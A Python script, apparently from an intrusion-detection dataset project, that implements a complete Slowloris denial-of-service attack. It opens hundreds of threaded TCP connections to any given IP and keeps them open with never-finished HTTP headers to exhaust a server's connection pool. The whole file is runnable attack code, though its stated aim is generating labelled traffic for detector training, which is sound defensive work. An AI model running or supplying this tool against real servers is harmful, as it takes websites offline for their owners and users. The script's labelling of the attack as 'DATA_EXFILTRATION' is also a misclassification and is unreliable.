"""
dataset/generators/slowloris_gen.py
=====================================
Slowloris — slow HTTP connection exhaustion attack.

Opens many TCP connections to target:80 and sends partial HTTP headers
very slowly, keeping each connection open without ever completing the request.
This exhausts the server's connection pool without high bandwidth.

Observable features this generates:
  - Many concurrent connections to same dst_ip:80
  - Very regular IAT (~15s between keep-alive header lines)
  - Zeek conn_state = S1 (SYN+ACK seen, data started, never finished)
  - Low packet rate (opposite of DDoS flood)
  - All connections to same dst_port=80

Usage:
  python slowloris_gen.py --target 192.168.1.10 --connections 200 --duration 120
"""
import argparse
import socket
import sys
import threading
import time


_stop_event = threading.Event()


def slowloris_worker(target: str, port: int, worker_id: int, send_interval: float):
    """One Slowloris connection — keeps sending partial headers slowly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        # Initial partial HTTP request
        s.send(f"GET /?id={worker_id} HTTP/1.1\r\nHost: {target}\r\n".encode())

        counter = 0
        while not _stop_event.is_set():
            time.sleep(send_interval)
            try:
                # Keep-alive header — never send the final \r\n
                s.send(f"X-keep-alive: {counter}\r\n".encode())
                counter += 1
            except (socket.error, OSError):
                break   # connection was reset/closed by server
    except (socket.error, OSError, ConnectionRefusedError):
        pass   # server may not be running — that's OK for traffic generation
    finally:
        try:
            s.close()
        except Exception:
            pass


def run(target: str, port: int, connections: int, duration: int, send_interval: float):
    # Alert schema threat_class: DATA_EXFILTRATION (Section 6, SIH26145 spec doc)
    # Slowloris exhausts TCP connection slots — resource-abuse, classified as DATA_EXFILTRATION.
    # Dataset CSV label column value: DATA_EXFILTRATION
    print(f"[slowloris] Target      : {target}:{port}")
    print(f"[slowloris] Label       : DATA_EXFILTRATION  (SIH26145 §6 threat_class enum)")
    print(f"[slowloris] Connections : {connections}")
    print(f"[slowloris] Send interval: {send_interval}s")
    print(f"[slowloris] Duration    : {duration}s")
    print(f"[slowloris] Starting...")

    threads = []
    for i in range(connections):
        t = threading.Thread(
            target = slowloris_worker,
            args   = (target, port, i, send_interval),
            daemon = True,
        )
        t.start()
        threads.append(t)
        time.sleep(0.05)   # stagger connection opens slightly

    print(f"[slowloris] {connections} connections opened. Running for {duration}s...")
    time.sleep(duration)
    _stop_event.set()
    print(f"[slowloris] Done.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slowloris generator for SIH26145 dataset")
    parser.add_argument("--target",        required=True,     help="Target IP")
    parser.add_argument("--port",          type=int, default=80,   help="Target HTTP port")
    parser.add_argument("--connections",   type=int, default=200,  help="Number of slow connections")
    parser.add_argument("--duration",      type=int, default=120,  help="Duration in seconds")
    parser.add_argument("--send-interval", type=float, default=15.0, help="Seconds between keep-alive sends")
    args = parser.parse_args()

    try:
        run(args.target, args.port, args.connections, args.duration, args.send_interval)
    except KeyboardInterrupt:
        _stop_event.set()
        print("\n[slowloris] Stopped by user.")
